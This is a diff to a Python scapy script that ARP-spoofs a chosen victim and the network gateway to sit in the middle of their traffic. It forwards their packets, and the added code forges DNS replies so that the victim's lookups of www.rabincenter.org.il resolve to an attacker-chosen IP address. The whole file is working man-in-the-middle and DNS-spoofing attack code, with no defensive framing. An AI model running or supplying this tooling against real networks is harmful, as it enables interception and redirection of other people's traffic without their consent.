@@ -1,5 +1,6 @@
 from scapy.all import*
-from scapy.layers.inet import IP
+from scapy.layers.dns import DNSRR, DNS, DNSQR
+from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import ARP, Ether
 import subprocess
 import socket
@@ -87,8 +88,8 @@ def scan(ip, subnet, gateway):
     return clients, my_mac, gateway_mac
 
 
-# finds the ip of the gateway
-def scan_gateway(default_gateway):
+# finds the ip of a host
+def scan_host(default_gateway):
     # Set the target ip
     target_ip = default_gateway
     # create ARP packet
@@ -98,16 +99,16 @@ def scan_gateway(default_gateway):
     # creating the packet
     packet = ether_layer / arp_layer
     result = ""
-    gateway_mac = ""
+    host_mac = ""
 
     # keep sending arp packets until it receives an answer
     while len(result) == 0:
         result = srp(packet, timeout=3, verbose=0)[0]
 
     for sent, received in result:
-        gateway_mac = received.hwsrc
+        host_mac = received.hwsrc
 
-    return gateway_mac
+    return host_mac
 
 
 # spoofing the arp tables of the victim and the gateway
@@ -115,13 +116,16 @@ def arp_spoof(chosen_ip, gateway_ip, my_mac, victim_mac, gateway_mac):
     end = time.time() + 3 * 60
     # attack again to remain in the middle
     while time.time() < end:
-        # op 2 - is_at , sending to the victim ARP packet with my mac attached to the gateway ip
-        arp_packet = ARP(op=2, pdst=chosen_ip, psrc=gateway_ip, hwsrc=my_mac, hwdst=victim_mac)
-        send(arp_packet, verbose=0)
-        # op 2 - is_at , sending to the default gateway ARP packet with my mac attached to the victim ip
-        arp_packet = ARP(op=2, pdst=gateway_ip, psrc=chosen_ip, hwsrc=my_mac, hwdst=gateway_mac)
-        send(arp_packet, verbose=0)
-        time.sleep(3)
+        try:
+            # op 2 - is_at , sending to the victim ARP packet with my mac attached to the gateway ip
+            arp_packet = ARP(op=2, pdst=chosen_ip, psrc=gateway_ip, hwsrc=my_mac, hwdst=victim_mac)
+            send(arp_packet, verbose=0)
+            # op 2 - is_at , sending to the default gateway ARP packet with my mac attached to the victim ip
+            arp_packet = ARP(op=2, pdst=gateway_ip, psrc=chosen_ip, hwsrc=my_mac, hwdst=gateway_mac)
+            send(arp_packet, verbose=0)
+            time.sleep(3)
+        except Exception as ex:
+            print(str(ex))
     print("spof")
     return
 
@@ -135,9 +139,22 @@ def packets_forwarding():
 # change the packets destination (victim->gateway, gateway->victim)
 def forward(packet):
     if packet[IP].src == chosen_ip and packet[Ether].dst == my_mac:
-        packet[Ether].src = my_mac
-        packet[Ether].dst = gateway_mac
+        # check for DNS query
+        if DNSQR in packet:
+            packet, spoofed = change_packet(packet)
+            # if the packet changed send it to victim
+            if spoofed:
+                packet[Ether].src = my_mac
+                packet[Ether].dst = chosen_mac
+            else:
+                packet[Ether].src = my_mac
+                packet[Ether].dst = gateway_mac
+        else:
+            packet[Ether].src = my_mac
+            packet[Ether].dst = gateway_mac
+
         sock.send(packet)
+
     elif packet[IP].dst == chosen_ip:
         packet[Ether].src = my_mac
         packet[Ether].dst = chosen_mac
@@ -150,31 +167,63 @@ def filter_packets(packet):
     return IP in packet and (packet[Ether].src == chosen_mac or packet[Ether].src == gateway_mac)
 
 
+# changing the DNS answer for a specific domain
+def change_packet(pkt):
+    # get the real name of the query
+    real_name = pkt[DNSQR].qname.decode()[:-1]
+    fake_ip = "157.240.20.35"
+    # if the victim entered the given website, change the packet
+    spoofed = False
+    if real_name == "www.rabincenter.org.il":
+        spoofed = True
+        # create a reply to the query with the same name but a different ip
+        spoofed_pkt = Ether() / IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
+                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=0, qr=1,
+                          an=DNSRR(rrname=pkt[DNSQR].qname, ttl=15, rdata=fake_ip))
+        # deletes old checksums
+        del pkt[IP].len
+        del pkt[IP].chksum
+        del pkt[UDP].len
+        del pkt[UDP].chksum
+        return spoofed_pkt, spoofed
+    return pkt, spoofed
+
+
 if __name__ == '__main__':
     ip, subnet, default_gate = get_configs()
     time.sleep(1)
-    clients, my_mac, gateway_mac = scan(ip, subnet, default_gate)
-    print("IP" + " "*15 + "MAC")
-    if clients:
+    my_mac = ""
+    gateway_mac = ""
+    # choose to scan the entire network or only one host
+    choice = input("enter an ip or type scan to scan the entire network")
+    if choice == "scan":
+        clients, my_mac, gateway_mac = scan(ip, subnet, default_gate)
+        print("IP" + " "*15 + "MAC")
+        if clients:
+            for client in clients:
+                print("{}   {}".format(client['ip'], client['mac']))
+        else:
+            print("scan failed")
+            exit(1)
+
+        # choose an ip of the victim
+        chosen_ip = input("Enter IP")
+        chosen_mac = ""
         for client in clients:
-            print("{}   {}".format(client['ip'], client['mac']))
+            if client['ip'] == chosen_ip:
+                chosen_mac = client['mac']
+
     else:
-        print("scan failed")
-        exit(1)
+        chosen_ip = choice
+        chosen_mac = scan_host(choice)
 
     # if the scan didn't get the gateway, scan the gateway until it receives its ip
     if not gateway_mac:
-        gateway_mac = scan_gateway(default_gate)
+        gateway_mac = scan_host(default_gate)
 
     if not my_mac:
         my_mac = ARP().hwsrc
-
-    # choose an ip of the victim
-    chosen_ip = input("Enter IP")
-    chosen_mac = ""
-    for client in clients:
-        if client['ip'] == chosen_ip:
-            chosen_mac = client['mac']
 
     if chosen_mac:
         # creating a single socket for all the packets that scapy send
